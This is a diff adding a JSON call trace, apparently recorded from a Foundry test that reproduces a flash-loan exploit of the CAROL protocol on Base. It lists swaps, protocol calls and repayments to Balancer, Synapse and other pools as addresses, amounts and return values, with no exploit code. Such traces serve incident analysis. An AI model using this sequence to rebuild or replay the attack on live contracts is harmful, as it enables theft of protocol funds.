+        "return_value": "[3400000000000000000000 [3.4e21], 15597126006409689141027309 [1.559e25]]"
+    },
+    {
+        "id": "2564",
+        "args": "WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "51805642280058124496 [5.18e19], 15835374312611974831091951 [1.583e25], 1701281507 [1.701e9]"
+    },
+    {
+        "id": "564",
+        "args": "WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "3264",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 3400000000000000000000 [3.4e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "564",
+        "args": "WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "39441",
+        "args": "0, 15597126006409689141027309 [1.559e25], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "25410",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15597126006409689141027309 [1.559e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "3451805642280058124496 [3.451e21]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "238248306202285690064642 [2.382e23]"
+    },
+    {
+        "id": "651",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "15597126006409689141027309 [1.559e25]"
+    },
+    {
+        "id": "200",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    },
+    {
+        "id": "62562",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "",
+        "description": "",
+        "return_value": "2927235194430644552183 [2.927e21]"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "3451805642280058124496 [3.451e21], 238248306202285690064642 [2.382e23], 1701348645 [1.701e9]"
+    },
+    {
+        "id": "455867",
+        "args": "2927235194430644552183 [2.927e21]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "3451805642280058124496 [3.451e21], 238248306202285690064642 [2.382e23], 1701348645 [1.701e9]"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "3451805642280058124496 [3.451e21], 238248306202285690064642 [2.382e23], 1701348645 [1.701e9]"
+    },
+    {
+        "id": "6139",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 2927235194430644552183 [2.927e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "22933",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 2927235194430644552183 [2.927e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "128099",
+        "args": "2927235194430644552183 [2.927e21], 0, [0x4A0a76645941d8C7ba059940B3446228F0DB8972, 0x4200000000000000000000000000000000000006], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701348945 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[2927235194430644552183 [2.927e21], 41792348115915993917 [4.179e19]]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "3451805642280058124496 [3.451e21], 238248306202285690064642 [2.382e23], 1701348645 [1.701e9]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "6217",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 2927235194430644552183 [2.927e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "36116",
+        "args": "41792348115915993917 [4.179e19], 0, Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "22901",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 41792348115915993917 [4.179e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "3410013294164142130579 [3.41e21]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "241175541396716334616825 [2.411e23]"
+    },
+    {
+        "id": "9147",
+        "args": "41792348115915993917 [4.179e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "83",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "58274",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "651",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "15597126006409689141027309 [1.559e25]"
+    },
+    {
+        "id": "50677",
+        "args": "14037413405768720226924578 [1.403e25], 0, [0x4A0a76645941d8C7ba059940B3446228F0DB8972, 0x4200000000000000000000000000000000000006], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701352645 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[14037413405768720226924578 [1.403e25], 3352273829341354684064 [3.352e21]]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "3410013294164142130579 [3.41e21], 241175541396716334616825 [2.411e23], 1701348645 [1.701e9]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "3992",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 14037413405768720226924578 [1.403e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "36116",
+        "args": "3352273829341354684064 [3.352e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "22901",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3352273829341354684064 [3.352e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "57739464822787446515 [5.773e19]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "14278588947165436561541403 [1.427e25]"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "57739464822787446515 [5.773e19], 14278588947165436561541403 [1.427e25], 1701348645 [1.701e9]"
+    },
+    {
+        "id": "388",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "28326881457823205641544 [2.832e22]"
+    },
+    {
+        "id": "24442",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 21528416296980248144757 [2.152e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "140967",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], 21528416296980248144757 [2.152e22], 0, 0, CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 1701348945 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "10843125270688648356602531 [1.084e25], 43847207343292315416 [4.384e19]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "25849",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 21528416296980248144757 [2.152e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "88258",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86]",
+        "original_code": null,
+        "description": null,
+        "return_value": "43847207343292315416 [4.384e19], 10843125270688648356602531 [1.084e25]"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "57739464822787446515 [5.773e19]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "14278588947165436561541403 [1.427e25]"
+    },
+    {
+        "id": "314",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xAF1823bACd8EDDA3b815180a61F8741fA4aBc6Dd"
+    },
+    {
+        "id": "22901",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 43847207343292315416 [4.384e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "25410",
+        "args": "Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 10843125270688648356602531 [1.084e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "13892257479495131099 [1.389e19]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "3435463676476788204938872 [3.435e24]"
+    },
+    {
+        "id": "6310",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 10843125270688648356602531 [1.084e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9147",
+        "args": "43847207343292315416 [4.384e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "83",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "55",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "58503",
+        "args": "0, [0x4200000000000000000000000000000000000006, 0x4A0a76645941d8C7ba059940B3446228F0DB8972], CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 1701348945 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[43847207343292315416 [4.384e19], 2607310408656537245362820 [2.607e24]]"
+    },
+    {
+        "id": "564",
+        "args": "WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "13892257479495131099 [1.389e19], 3435463676476788204938872 [3.435e24], 1701348645 [1.701e9]"
+    },
+    {
+        "id": "21802",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "564",
+        "args": "WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "3001",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 43847207343292315416 [4.384e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "564",
+        "args": "WETH: [0x4200000000000000000000000000000000000006], CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "16725",
+        "args": "0, 2607310408656537245362820 [2.607e24], CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3510",
+        "args": "CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 2607310408656537245362820 [2.607e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "57739464822787446515 [5.773e19]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "828153267820250959576052 [8.281e23]"
+    },
+    {
+        "id": "651",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1559712600640968914102731 [1.559e24]"
+    },
+    {
+        "id": "30777",
+        "args": "1559712600640968914102731 [1.559e24], 0, [0x4A0a76645941d8C7ba059940B3446228F0DB8972, 0x4200000000000000000000000000000000000006], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701352645 [1.701e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[1559712600640968914102731 [1.559e24], 37681664207315214473 [3.768e19]]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "504",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "57739464822787446515 [5.773e19], 828153267820250959576052 [8.281e23], 1701348645 [1.701e9]"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "3992",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 1559712600640968914102731 [1.559e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "564",
+        "args": "CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86"
+    },
+    {
+        "id": "16216",
+        "args": "37681664207315214473 [3.768e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3001",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 37681664207315214473 [3.768e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "20057800615472232042 [2.005e19]"
+    },
+    {
+        "id": "651",
+        "args": "0x0C477c729816228AF3Cb4E014cbF9412aA080b86",
+        "original_code": null,
+        "description": null,
+        "return_value": "2387865868461219873678783 [2.387e24]"
+    },
+    {
+        "id": "1902",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3001",
+        "args": "WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0], 622657293773920288443 [6.226e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3474654729397892317848 [3.474e21]"
+    },
+    {
+        "id": "3045",
+        "args": "WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7061557323715 [7.061e12]"
+    },
+    {
+        "id": "2559",
+        "args": "WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7061557323715 [7.061e12]"
+    },
+    {
+        "id": "4854",
+        "args": "WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0], false",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000001e"
+    },
+    {
+        "id": "7801",
+        "args": "0x8EfE209dd8868Ed7C9946761b17A8BE6A77Ade7C, 1867971881321760865 [1.867e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3472786757516570556983 [3.472e21]"
+    },
+    {
+        "id": "1045",
+        "args": "WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7061557323715 [7.061e12]"
+    },
+    {
+        "id": "559",
+        "args": "WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7061557323715 [7.061e12]"
+    },
+    {
+        "id": "3001",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18], 339417286401008832265 [3.394e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "339417286401008832265 [3.394e20]"
+    },
+    {
+        "id": "1045",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1162130361162 [1.162e12]"
+    },
+    {
+        "id": "559",
+        "args": "WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1162130361162 [1.162e12]"
+    },
+    {
+        "id": "3001",
+        "args": "Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17], 323763704678691242275 [3.237e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1045",
+        "args": "Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "671024918530 [6.71e11]"
+    },
+    {
+        "id": "559",
+        "args": "Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "671024918530 [6.71e11]"
+    },
+    {
+        "id": "457",
+        "args": "Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "323763704678691242275 [3.237e20]"
+    },
+    {
+        "id": "2327",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "14703274077976679431066 [1.47e22]"
+    },
+    {
+        "id": "327",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "14703274077976679431066 [1.47e22]"
+    },
+    {
+        "id": "3001",
+        "args": "BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 824240035672384091573 [8.242e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "824240035672384091573 [8.242e20]"
+    },
+    {
+        "id": "3001",
+        "args": "SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f], 1293199071704484549636 [1.293e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "457",
+        "args": "SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1293199071704484549636 [1.293e21]"
+    },
+    {
+        "id": "457",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "28471449434096888262 [2.847e19]"
+    },
+    {
+        "id": "9336",
+        "args": "28471449434096888262 [2.847e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "272",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
